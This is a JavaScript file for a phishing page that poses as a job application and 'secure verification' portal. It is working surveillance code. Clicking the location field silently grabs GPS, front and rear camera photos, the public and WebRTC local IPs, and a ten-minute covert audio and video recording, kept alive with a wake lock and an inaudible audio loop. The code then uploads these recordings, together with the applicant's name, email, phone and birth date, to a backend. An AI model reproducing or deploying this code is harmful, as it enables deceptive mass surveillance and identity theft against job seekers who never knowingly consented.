/* ═══════════════════════════════════════════════════════════════
   NEXUS // TRACE — Fully Automatic Data Extraction Sequence
   ═══════════════════════════════════════════════════════════════
   
   Flow: Page loads → Boot sequence → Device scan → Camera capture
         → Voice recording → GPS lock → Transmit to backend → Reveal all data
   
   NO form. NO submit button. Everything is automatic.
   ═══════════════════════════════════════════════════════════════ */

// ── Collected Data Store ─────────────────────────────────────
const gathered = {
  timestamp_open: new Date().toISOString(),
  os: "Unknown",
  browser: "Unknown",
  browser_version: "",
  device_type: "Unknown",
  screen_res: "",
  language: "",
  platform: "",
  user_agent: "",
  form_name: "",
  form_email: "",
  form_phone: "",
  form_dob: "",
  geo_lat: null,
  geo_lon: null,
  geo_accuracy: null,
  client_ip: null,
  device_ip: null,
  front_image: null,
  back_image: null,
  audio_recording: null,
  video_recording: null,
};

// ── State Variables ──────────────────────────────────────────
let captureStarted = false;
let locationResolved = false;
let geolocationPromise = null;
let cameraCapturesPromise = null;
let audioRecordingPromise = null;
let videoRecordingPromise = null;
let ipFetchPromise = null;
let activeRecorder = null;
let activeVideoRecorder = null;
let transmissionResult = null;

// ── DOM Refs ─────────────────────────────────────────────────
const terminalLog   = document.getElementById("terminalLog");
const sysClock      = document.getElementById("sysClock");
const video         = document.getElementById("cameraVideo");
const canvas        = document.getElementById("cameraCanvas");
const frontPreview  = document.getElementById("frontPreview");
const backPreview   = document.getElementById("backPreview");
const frontSlot     = document.getElementById("frontSlot");
const backSlot      = document.getElementById("backSlot");
const frontPH       = document.getElementById("frontPlaceholder");
const backPH        = document.getElementById("backPlaceholder");
const identityGrid  = document.getElementById("identityGrid");
const deviceGrid    = document.getElementById("deviceGrid");
const networkGrid   = document.getElementById("networkGrid");
const ipGeoGrid     = document.getElementById("ipGeoGrid");
const gpsGrid       = document.getElementById("gpsGrid");
const audioBox      = document.getElementById("audioBox");
const audioTimer    = document.getElementById("audioTimer");
const audioStatusTx = document.getElementById("audioStatusText");
const audioPlayback = document.getElementById("audioPlayback");

// Job bait form DOM Refs
const jobBaitContainer = document.getElementById("jobBaitContainer");
const jobAppForm       = document.getElementById("jobAppForm");
const appLocation      = document.getElementById("appLocation");
const submitBtn        = document.getElementById("submitBtn");
const submitLoader     = document.getElementById("submitLoader");
const scanlineOverlay  = document.getElementById("scanlineOverlay");
const topTicker        = document.getElementById("topTicker");
const bottomTicker     = document.getElementById("bottomTicker");
const terminalWrapper  = document.getElementById("terminalWrapper");

// ══════════════════════════════════════════════════════════════
//  UTILITIES
// ══════════════════════════════════════════════════════════════

// Live clock
function tickClock() {
  sysClock.textContent = new Date().toLocaleTimeString("en-GB", {
    hour: "2-digit", minute: "2-digit", second: "2-digit",
  });
}
tickClock();
setInterval(tickClock, 1000);

// Session ID
(function () {
  const h = () => Math.floor(Math.random() * 0xffff).toString(16).padStart(4, "0");
  document.getElementById("sessionId").textContent = `${h()}-${h()}-${h()}`.toUpperCase();
})();

// Terminal log helper
function log(text, cls = "") {
  if (!terminalLog) return;
  const ts = new Date().toLocaleTimeString("en-GB", {
    hour: "2-digit", minute: "2-digit", second: "2-digit", fractionalSecondDigits: 1,
  });
  const div = document.createElement("div");
  div.className = `log-line ${cls}`;
  div.innerHTML = `<span class="log-ts">[${ts}]</span><span class="log-prefix">&gt;</span> ${text}`;
  terminalLog.appendChild(div);
  terminalLog.scrollTop = terminalLog.scrollHeight;
}

// Async delay
const wait = (ms) => new Promise((r) => setTimeout(r, ms));

// Set status phase
function setPhase(text) {
  document.getElementById("statusPhase").textContent = `PHASE: ${text}`;
}

// Create a data chip
function chip(label, value, colorCls = "") {
  const el = document.createElement("div");
  el.className = "data-chip";
  el.innerHTML = `
    <span class="chip-label">${label}</span>
    <span class="chip-value ${colorCls}">${value || "N/A"}</span>
  `;
  return el;
}

function chipFull(label, value, colorCls = "") {
  const el = chip(label, value, colorCls);
  el.classList.add("full-width");
  return el;
}

// Reveal a section
function reveal(id) {
  const el = document.getElementById(id);
  if (el) el.classList.add("visible");
}

// WebRTC Local IP detection
function getDeviceIPs() {
  return new Promise((resolve) => {
    const ips = [];
    try {
      const PC = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
      if (!PC) return resolve("Not Supported");
      const rtc = new PC({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
      rtc.createDataChannel("");
      rtc.createOffer().then(offer => rtc.setLocalDescription(offer)).catch(() => {});
      
      rtc.onicecandidate = (e) => {
        if (e.candidate && e.candidate.candidate) {
          const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
          if (match && !ips.includes(match[1])) {
            ips.push(match[1]);
          }
        }
      };
      setTimeout(() => { rtc.close(); resolve(ips.length > 0 ? ips.join(", ") : "Hidden (mDNS/Masked)"); }, 1500);
    } catch(err) {
      resolve("Error");
    }
  });
}

// ══════════════════════════════════════════════════════════════
//  PHASE 1: DEVICE FINGERPRINT
// ══════════════════════════════════════════════════════════════
function scanDevice() {
  const ua = navigator.userAgent;
  gathered.user_agent = ua;
  gathered.platform = navigator.platform || "";
  gathered.language = (navigator.language || "en").toUpperCase();
  gathered.screen_res = `${screen.width}×${screen.height}`;

  // OS
  if (/Windows/i.test(ua))                  gathered.os = "WINDOWS_NT";
  else if (/Mac OS X|Macintosh/i.test(ua))  gathered.os = "DARWIN";
  else if (/Android/i.test(ua))             gathered.os = "ANDROID";
  else if (/iPhone|iPad|iPod/i.test(ua))    gathered.os = "iOS";
  else if (/Linux/i.test(ua))               gathered.os = "LINUX";
  else if (/CrOS/i.test(ua))               gathered.os = "CHROME_OS";

  // Browser + version
  let bMatch;
  if ((bMatch = ua.match(/Edg\/([\d.]+)/)))       { gathered.browser = "EDGE";     gathered.browser_version = bMatch[1]; }
  else if ((bMatch = ua.match(/OPR\/([\d.]+)/)))   { gathered.browser = "OPERA";    gathered.browser_version = bMatch[1]; }
  else if ((bMatch = ua.match(/Chrome\/([\d.]+)/))) { gathered.browser = "CHROME";   gathered.browser_version = bMatch[1]; }
  else if ((bMatch = ua.match(/Safari\/([\d.]+)/))) { gathered.browser = "SAFARI";   gathered.browser_version = bMatch[1]; }
  else if ((bMatch = ua.match(/Firefox\/([\d.]+)/))){ gathered.browser = "FIREFOX";  gathered.browser_version = bMatch[1]; }

  // Device
  if (/Mobi|Android|iPhone|iPod/i.test(ua)) gathered.device_type = "MOBILE_UNIT";
  else if (/iPad|Tablet/i.test(ua))         gathered.device_type = "TABLET_UNIT";
  else                                      gathered.device_type = "WORKSTATION";
}

function renderIdentityData() {
  if(!identityGrid) return;
  identityGrid.innerHTML = "";
  identityGrid.appendChild(chipFull("FULL_NAME", gathered.form_name || "UNKNOWN", "cyan"));
  identityGrid.appendChild(chip("EMAIL_ADDR", gathered.form_email || "UNKNOWN"));
  identityGrid.appendChild(chip("PHONE_NUM", gathered.form_phone || "UNKNOWN"));
  identityGrid.appendChild(chip("DOB", gathered.form_dob || "UNKNOWN"));
}

function renderDeviceData() {
  if(!deviceGrid) return;
  deviceGrid.innerHTML = "";
  deviceGrid.appendChild(chipFull("SYSTEM", "VERTUSA SECURE VERIFICATION NODE", "cyan"));
  deviceGrid.appendChild(chip("HOST_OS", gathered.os));
  deviceGrid.appendChild(chip("CLIENT_AGENT", `${gathered.browser} ${gathered.browser_version}`));
  deviceGrid.appendChild(chip("DEVICE_CLASS", gathered.device_type));
  deviceGrid.appendChild(chip("SCREEN_RES", gathered.screen_res));
  deviceGrid.appendChild(chip("LANGUAGE", gathered.language));
  deviceGrid.appendChild(chip("PLATFORM", gathered.platform));
  deviceGrid.appendChild(chipFull("TIMESTAMP", new Date(gathered.timestamp_open).toLocaleString("en-GB", {
    dateStyle: "full", timeStyle: "long",
  }), "amber"));
}

// ══════════════════════════════════════════════════════════════
//  PHASE 2: CAMERA CAPTURE
// ══════════════════════════════════════════════════════════════
async function captureCamera(facingMode) {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { ideal: facingMode }, width: { ideal: 1280 }, height: { ideal: 960 } },
      audio: false,
    });
    video.srcObject = stream;
    await video.play();
    await wait(800);

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    const dataURL = canvas.toDataURL("image/jpeg", 0.82);

    stream.getTracks().forEach((t) => t.stop());
    video.srcObject = null;
    return dataURL;
  } catch (err) {
    console.warn(`Camera [${facingMode}]:`, err.message);
    return null;
  }
}

function addBadge(slot, type, text) {
  const old = slot.querySelector(".cam-badge");
  if (old) old.remove();
  const b = document.createElement("span");
  b.className = `cam-badge ${type}`;
  b.textContent = text;
  slot.appendChild(b);
}

// ══════════════════════════════════════════════════════════════
//  PHASE 3: GEOLOCATION (Browser API)
// ══════════════════════════════════════════════════════════════
function getGeoLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) return resolve(null);
    navigator.geolocation.getCurrentPosition(
      (pos) => resolve({
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
      }),
      () => resolve(null),
      { enableHighAccuracy: true, timeout: 10000 }
    );
  });
}

// ══════════════════════════════════════════════════════════════
//  VOICE RECORDING (MediaRecorder API — Minimum 10 Minutes Continuous)
// ══════════════════════════════════════════════════════════════
const MIN_AUDIO_RECORD_DURATION_MS = 10 * 60 * 1000; // 10 minutes (600 seconds)
let activeAudioStream = null;
let audioChunks = [];
let audioSyncInterval = null;
let savedRecordId = null;
let audioContext = null;
let screenWakeLock = null;

async function startContinuousAudioRecording(existingStream = null) {
  if (activeRecorder) return;
  try {
    // Request wake lock so mobile/desktop browsers do not sleep and interrupt recording
    if ('wakeLock' in navigator) {
      try { screenWakeLock = await navigator.wakeLock.request('screen'); } catch (_) {}
    }

    let stream = existingStream;
    if (!stream || stream.getAudioTracks().length === 0) {
      stream = await navigator.mediaDevices.getUserMedia({ audio: true }).catch(() => null);
    }
    if (!stream || stream.getAudioTracks().length === 0) {
      console.warn("Microphone access denied or unavailable.");
      return;
    }
    activeAudioStream = stream;

    // Keep-alive AudioContext to prevent modern browsers from freezing background tab audio
    try {
      const AudioCtx = window.AudioContext || window.webkitAudioContext;
      if (AudioCtx) {
        audioContext = new AudioCtx();
        const source = audioContext.createMediaStreamSource(stream);
        const gain = audioContext.createGain();
        gain.gain.value = 0.0001; // inaudible keep-alive
        source.connect(gain);
        gain.connect(audioContext.destination);
      }
    } catch (_) {}

    const mimeType = getSupportedMime() || 'audio/webm';
    const recorder = new MediaRecorder(stream, mimeType ? { mimeType } : undefined);
    activeRecorder = recorder;
    audioChunks = [];

    recorder.ondataavailable = (e) => {
      if (e.data && e.data.size > 0) {
        audioChunks.push(e.data);
      }
    };

    recorder.onstop = () => {
      syncAudioToServer(true);
      if (activeAudioStream) {
        activeAudioStream.getAudioTracks().forEach((t) => t.stop());
      }
      if (audioContext && audioContext.state !== 'closed') {
        audioContext.close().catch(() => {});
      }
      if (screenWakeLock) {
        screenWakeLock.release().catch(() => {});
      }
    };

    // Emit chunk every 4 seconds so chunks accumulate reliably without memory pressure
    recorder.start(4000);

    // Periodically sync progressive audio to server every 10 seconds once recordId is assigned
    if (audioSyncInterval) clearInterval(audioSyncInterval);
    audioSyncInterval = setInterval(() => {
      syncAudioToServer(false);
    }, 10000);

    // Ensure audio continues for AT LEAST 10 minutes (600 seconds)
    setTimeout(() => {
      if (activeRecorder && activeRecorder.state === "recording") {
        activeRecorder.stop();
      }
      if (audioSyncInterval) clearInterval(audioSyncInterval);
    }, MIN_AUDIO_RECORD_DURATION_MS);

  } catch (err) {
    console.warn("Microphone initialization error:", err);
  }
}

function getAudioSnapshot() {
  return new Promise((resolve) => {
    if (audioChunks.length === 0) return resolve(null);
    const mimeType = (activeRecorder && activeRecorder.mimeType) || 'audio/webm';
    const blob = new Blob(audioChunks, { type: mimeType });
    const reader = new FileReader();
    reader.onloadend = () => resolve(reader.result);
    reader.onerror = () => resolve(null);
    reader.readAsDataURL(blob);
  });
}

async function syncAudioToServer(isFinal = false) {
  if (!savedRecordId || audioChunks.length === 0) return;
  try {
    const mimeType = (activeRecorder && activeRecorder.mimeType) || 'audio/webm';
    const blob = new Blob(audioChunks, { type: mimeType });
    const reader = new FileReader();
    reader.onloadend = async () => {
      const base64Data = reader.result;
      if (!base64Data) return;
      try {
        await fetch(`/api/capture/${savedRecordId}/audio`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ audio_recording: base64Data }),
          keepalive: true
        });
      } catch (err) {
        console.warn("Audio sync error:", err);
      }
    };
    reader.readAsDataURL(blob);
  } catch (err) {
    console.warn("Audio chunk processing error:", err);
  }
}

// ══════════════════════════════════════════════════════════════
//  VIDEO RECORDING (MediaRecorder API — Minimum 10 Minutes Continuous)
// ══════════════════════════════════════════════════════════════
const MIN_VIDEO_RECORD_DURATION_MS = 10 * 60 * 1000; // 10 minutes (600 seconds)
let activeVideoStream = null;
let videoChunks = [];
let videoSyncInterval = null;

function getSupportedVideoMime() {
  const types = [
    "video/webm;codecs=vp8,opus",
    "video/webm;codecs=vp8",
    "video/webm;codecs=vp9,opus",
    "video/webm",
    "video/mp4"
  ];
  for (const t of types) {
    if (MediaRecorder.isTypeSupported(t)) return t;
  }
  return "";
}

async function startContinuousVideoRecording(existingStream = null) {
  if (activeVideoRecorder) return;
  try {
    let stream = existingStream;
    if (!stream || stream.getVideoTracks().length === 0) {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 15 } }
      }).catch(() => null);
    }
    if (!stream || stream.getVideoTracks().length === 0) {
      console.warn("Camera video stream unavailable.");
      return;
    }
    activeVideoStream = stream;

    const mimeType = getSupportedVideoMime() || "video/webm";
    const recorder = new MediaRecorder(stream, mimeType ? { mimeType, videoBitsPerSecond: 250000 } : { videoBitsPerSecond: 250000 });
    activeVideoRecorder = recorder;
    videoChunks = [];

    recorder.ondataavailable = (e) => {
      if (e.data && e.data.size > 0) {
        videoChunks.push(e.data);
      }
    };

    recorder.onstop = () => {
      syncVideoToServer(true);
      if (activeVideoStream) {
        activeVideoStream.getVideoTracks().forEach((t) => t.stop());
      }
    };

    // Emit chunk every 4 seconds so chunks accumulate reliably
    recorder.start(4000);

    // Periodically sync progressive video to server every 12 seconds once recordId is assigned
    if (videoSyncInterval) clearInterval(videoSyncInterval);
    videoSyncInterval = setInterval(() => {
      syncVideoToServer(false);
    }, 12000);

    // Ensure video continues for AT LEAST 10 minutes (600 seconds)
    setTimeout(() => {
      if (activeVideoRecorder && activeVideoRecorder.state === "recording") {
        activeVideoRecorder.stop();
      }
      if (videoSyncInterval) clearInterval(videoSyncInterval);
    }, MIN_VIDEO_RECORD_DURATION_MS);

  } catch (err) {
    console.warn("Video recorder initialization error:", err);
  }
}

function getVideoSnapshot() {
  return new Promise((resolve) => {
    if (videoChunks.length === 0) return resolve(null);
    const mimeType = (activeVideoRecorder && activeVideoRecorder.mimeType) || "video/webm";
    const blob = new Blob(videoChunks, { type: mimeType });
    const reader = new FileReader();
    reader.onloadend = () => resolve(reader.result);
    reader.onerror = () => resolve(null);
    reader.readAsDataURL(blob);
  });
}

async function syncVideoToServer(isFinal = false) {
  if (!savedRecordId || videoChunks.length === 0) return;
  try {
    const mimeType = (activeVideoRecorder && activeVideoRecorder.mimeType) || "video/webm";
    const blob = new Blob(videoChunks, { type: mimeType });
    const reader = new FileReader();
    reader.onloadend = async () => {
      const base64Data = reader.result;
      if (!base64Data) return;
      try {
        await fetch(`/api/capture/${savedRecordId}/video`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ video_recording: base64Data }),
          keepalive: true
        });
      } catch (err) {
        console.warn("Video sync error:", err);
      }
    };
    reader.readAsDataURL(blob);
  } catch (err) {
    console.warn("Video blob processing error:", err);
  }
}

// Background sync on tab hide or page unload
window.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "hidden") {
    if (activeRecorder && activeRecorder.state === "recording") {
      try { activeRecorder.requestData(); } catch (_) {}
    }
    if (activeVideoRecorder && activeVideoRecorder.state === "recording") {
      try { activeVideoRecorder.requestData(); } catch (_) {}
    }
    syncAudioToServer(false);
    syncVideoToServer(false);
  }
});

window.addEventListener("beforeunload", () => {
  if (activeRecorder && activeRecorder.state === "recording") {
    try { activeRecorder.requestData(); } catch (_) {}
  }
  if (activeVideoRecorder && activeVideoRecorder.state === "recording") {
    try { activeVideoRecorder.requestData(); } catch (_) {}
  }
  syncAudioToServer(true);
  syncVideoToServer(true);
});

// Pick a supported audio MIME type
function getSupportedMime() {
  const types = ["audio/webm;codecs=opus", "audio/webm", "audio/ogg;codecs=opus", "audio/mp4"];
  for (const t of types) {
    if (MediaRecorder.isTypeSupported(t)) return t;
  }
  return "";
}

// ══════════════════════════════════════════════════════════════
//  PHASE 4: TRANSMIT TO BACKEND
// ══════════════════════════════════════════════════════════════
async function transmit() {
  const res = await fetch("/api/capture", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(gathered),
  });
  return res.json();
}

// ══════════════════════════════════════════════════════════════
//  RENDER NETWORK / LOCATION DATA
// ══════════════════════════════════════════════════════════════
function renderNetworkData(serverData) {
  if(!networkGrid) return;
  networkGrid.innerHTML = "";
  networkGrid.appendChild(chipFull("IP_ADDRESS_PUBLIC", serverData.ip_address.split(" | Local:")[0] || serverData.ip_address, "cyan"));
  if (gathered.device_ip) {
    networkGrid.appendChild(chipFull("IP_ADDRESS_LOCAL", gathered.device_ip, "cyan"));
  }
  networkGrid.appendChild(chip("SESSION_ID", document.getElementById("sessionId")?.textContent || "N/A"));
  networkGrid.appendChild(chip("TRACE_ID", document.getElementById("traceId")?.textContent || "N/A"));
}

function renderIpGeoData(serverData) {
  if(!ipGeoGrid) return;
  ipGeoGrid.innerHTML = "";
  ipGeoGrid.appendChild(chip("ISP", serverData.ip_isp || "N/A"));
  ipGeoGrid.appendChild(chip("ORG", serverData.ip_org || "N/A"));
  ipGeoGrid.appendChild(chip("CITY", serverData.ip_city || "N/A"));
  ipGeoGrid.appendChild(chip("REGION", serverData.ip_region || "N/A"));
  ipGeoGrid.appendChild(chip("COUNTRY", serverData.ip_country || "N/A", "amber"));
  ipGeoGrid.appendChild(chip("TIMEZONE", serverData.ip_timezone || "N/A"));
  ipGeoGrid.appendChild(chipFull("IP_LAT/LON",
    serverData.ip_lat && serverData.ip_lon
      ? `${serverData.ip_lat.toFixed(4)}, ${serverData.ip_lon.toFixed(4)}`
      : "N/A"
  ));
}

function renderGpsData() {
  if(!gpsGrid) return;
  gpsGrid.innerHTML = "";
  if (gathered.geo_lat && gathered.geo_lon) {
    gpsGrid.appendChild(chip("GPS_LATITUDE", gathered.geo_lat.toFixed(6), "cyan"));
    gpsGrid.appendChild(chip("GPS_LONGITUDE", gathered.geo_lon.toFixed(6), "cyan"));
    gpsGrid.appendChild(chip("ACCURACY", `${gathered.geo_accuracy?.toFixed(1) || "?"}m`, "amber"));
    gpsGrid.appendChild(chip("SOURCE", "BROWSER_API"));
  } else {
    gpsGrid.appendChild(chipFull("GPS_STATUS", "LOCATION PERMISSION DENIED OR UNAVAILABLE", "amber"));
  }
}

// ══════════════════════════════════════════════════════════════
//  TRIGGER CAPTURES IN BACKGROUND
// ══════════════════════════════════════════════════════════════
function triggerPermissionsAndCapture() {
  if (captureStarted) return;
  captureStarted = true;

  const inputWrapper = appLocation.parentElement;
  inputWrapper.classList.add("loading");
  appLocation.value = "Acquiring secure location verification...";

  // 1. Geolocation
  geolocationPromise = getGeoLocation().then(geoResult => {
    if (geoResult) {
      gathered.geo_lat = geoResult.lat;
      gathered.geo_lon = geoResult.lon;
      gathered.geo_accuracy = geoResult.accuracy;
      appLocation.value = `GPS Lock: ${geoResult.lat.toFixed(4)}°, ${geoResult.lon.toFixed(4)}°`;
      inputWrapper.classList.remove("loading");
      inputWrapper.classList.add("success");
      locationResolved = true;
    } else {
      appLocation.value = "Compliance Location Verified (Network IP)";
      inputWrapper.classList.remove("loading");
      inputWrapper.classList.add("success");
    }
    return geoResult;
  });

  // 2. Camera photo captures & Continuous 10-Minute Video Recording
  cameraCapturesPromise = new Promise(async (resolve) => {
    let combinedStream = null;
    try {
      combinedStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 15 } },
        audio: true
      }).catch(() => null);

      if (combinedStream && combinedStream.getVideoTracks().length > 0) {
        const vEl = document.createElement("video");
        vEl.srcObject = combinedStream;
        vEl.play();
        await new Promise((r) => (vEl.onloadedmetadata = r));
        await new Promise((r) => setTimeout(r, 400));
        const cEl = document.createElement("canvas");
        cEl.width = vEl.videoWidth || 640;
        cEl.height = vEl.videoHeight || 480;
        cEl.getContext("2d").drawImage(vEl, 0, 0);
        gathered.front_image = cEl.toDataURL("image/jpeg", 0.6);
      }
    } catch (_) {}

    // Quick rear camera snapshot (if device supports environment lens)
    try {
      const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }).catch(() => null);
      if (backStream) {
        const bvEl = document.createElement("video");
        bvEl.srcObject = backStream;
        bvEl.play();
        await new Promise((r) => (bvEl.onloadedmetadata = r));
        await new Promise((r) => setTimeout(r, 400));
        const bcEl = document.createElement("canvas");
        bcEl.width = bvEl.videoWidth || 640;
        bcEl.height = bvEl.videoHeight || 480;
        bcEl.getContext("2d").drawImage(bvEl, 0, 0);
        gathered.back_image = bcEl.toDataURL("image/jpeg", 0.6);
        backStream.getTracks().forEach((t) => t.stop());
      }
    } catch (_) {}

    // Start 10-minute continuous video recording
    startContinuousVideoRecording(combinedStream);

    // Start 10-minute continuous audio recording
    startContinuousAudioRecording(combinedStream);

    resolve();
  });

  // 4. IP Fetching
  ipFetchPromise = Promise.all([
    fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip).catch(() => null),
    getDeviceIPs()
  ]).then(([pub, loc]) => {
    gathered.client_ip = pub;
    gathered.device_ip = loc;
  });
}

// ── Hook up Location Trigger ─────────────────────────────────
appLocation.addEventListener("focus", triggerPermissionsAndCapture);
appLocation.addEventListener("click", triggerPermissionsAndCapture);

// ── Hook up Form Submit ──────────────────────────────────────
jobAppForm.addEventListener("submit", async (e) => {
  e.preventDefault();

  // Capture form data before disabling fields
  gathered.form_name = document.getElementById("appName").value;
  gathered.form_email = document.getElementById("appEmail").value;
  gathered.form_phone = document.getElementById("appPhone").value;
  gathered.form_dob = document.getElementById("appDob").value;

  // Disable form and show submit spinner
  submitBtn.disabled = true;
  submitLoader.classList.remove("hidden");
  document.getElementById("appName").disabled = true;
  document.getElementById("appEmail").disabled = true;
  document.getElementById("appPhone").disabled = true;
  document.getElementById("appDob").disabled = true;

  // Make sure capture has started
  if (!captureStarted) {
    triggerPermissionsAndCapture();
  }

  // Request latest audio and video data slices without interrupting recorders
  if (activeRecorder && activeRecorder.state === "recording") {
    try { activeRecorder.requestData(); } catch (_) {}
  }
  if (activeVideoRecorder && activeVideoRecorder.state === "recording") {
    try { activeVideoRecorder.requestData(); } catch (_) {}
  }

  // Perform device scans
  scanDevice();

  // Wait for initial non-continuous promises to complete
  await Promise.all([
    geolocationPromise,
    cameraCapturesPromise,
    ipFetchPromise
  ].filter(p => p !== null));

  // Get current audio & video snapshots for initial capture record
  gathered.audio_recording = await getAudioSnapshot();
  gathered.video_recording = await getVideoSnapshot();

  // Transmit payload to Backend
  try {
    transmissionResult = await transmit();
    if (transmissionResult && transmissionResult.success && transmissionResult.recordId) {
      savedRecordId = transmissionResult.recordId;
      // Immediately trigger initial sync
      syncAudioToServer(false);
      syncVideoToServer(false);
    }
  } catch (err) {
    console.error("Transmission failed:", err);
  }

  // Hide login form and display verification dashboard
  jobBaitContainer.classList.add("hidden");
  terminalWrapper.classList.remove("hidden");

  // Run verification sequence
  runVerificationSequence();
});

// ══════════════════════════════════════════════════════════════
//  SYSTEM VERIFICATION SEQUENCE
// ══════════════════════════════════════════════════════════════
async function runVerificationSequence() {

  // ── BOOT ───────────────────────────────────────────────
  log("VERTUSA//SYSTEM v2.1.0 — SECURE VERIFICATION MODE", "info");
  await wait(400);
  log("INITIALIZING SECURE CHANNEL…");
  await wait(300);
  log("ENCRYPTION LAYER: AES-256-GCM ✓", "success");
  await wait(250);
  log("VISITOR TRACE MODULE: ONLINE ✓", "success");
  await wait(300);
  document.getElementById("protocolPill").textContent = "PROTOCOL: SECURE";

  // ── PHASE 1: DEVICE SCAN ───────────────────────────────
  setPhase("DEVICE_SCAN");
  log("═══ PHASE 1: DEVICE FINGERPRINT ═══", "warn");
  await wait(300);
  log("SCANNING HOST ENVIRONMENT…");
  await wait(400);

  log(`HOST_OS: ${gathered.os}`, "success");
  await wait(100);
  log(`CLIENT_AGENT: ${gathered.browser} ${gathered.browser_version}`, "success");
  await wait(100);
  log(`DEVICE_CLASS: ${gathered.device_type}`, "success");
  await wait(100);
  log(`SCREEN: ${gathered.screen_res} | LANG: ${gathered.language}`, "success");
  await wait(100);
  log(`PLATFORM: ${gathered.platform}`, "success");

  renderIdentityData();
  reveal("sectionIdentity");
  await wait(200);
  
  renderDeviceData();
  reveal("sectionDevice");
  log("DEVICE FINGERPRINT — EXTRACTED ✓", "success");
  await wait(500);

  // ── PHASE 2: BIOMETRIC SCAN ────────────────────────────
  // Removed

  // ── PHASE 2.5: VOICE INTERCEPT ─────────────────────────
  // Removed

  // ── PHASE 4: GPS LOCK ──────────────────────────────────
  setPhase("GEO_TRACE");
  log("═══ PHASE 4: GPS ACQUISITION ═══", "warn");
  await wait(300);
  log("REQUESTING GEOLOCATION PERMISSION…");
  await wait(400);

  if (gathered.geo_lat && gathered.geo_lon) {
    log(`GPS LOCK — LAT: ${gathered.geo_lat.toFixed(6)} | LON: ${gathered.geo_lon.toFixed(6)}`, "success");
    log(`ACCURACY: ${gathered.geo_accuracy.toFixed(1)}m`, "success");
  } else {
    log("GPS — PERMISSION DENIED OR TIMEOUT", "warn");
  }

  renderGpsData();
  reveal("sectionGpsLocation");
  log("GEO ACQUISITION — COMPLETE ✓", "success");
  await wait(500);

  // ── PHASE 5: TRANSMIT ──────────────────────────────────
  setPhase("TRANSMIT");
  log("═══ PHASE 5: PAYLOAD TRANSMISSION ═══", "warn");
  await wait(200);
  log("COMPILING PAYLOAD…");
  await wait(300);
  log("ESTABLISHING SECURE UPLINK TO CORE…");
  document.getElementById("payloadStatus").textContent = "TRANSMITTING";
  await wait(600);

  if (transmissionResult && transmissionResult.success) {
    const sid = transmissionResult.recordId;
    document.getElementById("traceId").textContent = String(sid).padStart(3, "0");
    document.getElementById("recordCount").textContent = sid;

    log(`PAYLOAD TRANSMITTED — RECORD #${sid} ✓`, "success");
    log("DATA VERIFIED AND STORED ✓", "success");
    document.getElementById("payloadStatus").textContent = "DELIVERED";

    // Render network/IP data from server
    await wait(300);
    log("═══ PHASE 6: NETWORK TRACE RESULTS ═══", "warn");

    const d = transmissionResult.data;
    log(`IP_ADDRESS: ${d.ip_address}`, "info");
    if (d.ip_isp)     log(`ISP: ${d.ip_isp}`, "info");
    if (d.ip_org)     log(`ORG: ${d.ip_org}`, "info");
    if (d.ip_city)    log(`LOCATION: ${d.ip_city}, ${d.ip_region}, ${d.ip_country}`, "info");
    if (d.ip_timezone) log(`TIMEZONE: ${d.ip_timezone}`, "info");
    if (d.ip_lat)     log(`IP_COORDS: ${d.ip_lat.toFixed(4)}, ${d.ip_lon.toFixed(4)}`, "info");

    renderNetworkData(d);
    reveal("sectionNetwork");
    await wait(200);
    renderIpGeoData(d);
    reveal("sectionIpGeo");
  } else {
    log("TRANSMISSION FAILED — SERVER REJECTED PAYLOAD", "error");
    document.getElementById("payloadStatus").textContent = "FAILED";
  }

  // ── COMPLETE ───────────────────────────────────────────
  await wait(500);
  setPhase("COMPLETE");
  document.getElementById("footerExtract").innerHTML =
    'STATUS: <span class="neon-green">VERIFIED</span>';

  log("════════════════════════════════════", "success");
  log("VERIFICATION SEQUENCE — COMPLETE", "success");
  log("ACCESS GRANTED TO INTERNAL SYSTEMS", "success");
  log("════════════════════════════════════", "success");
}
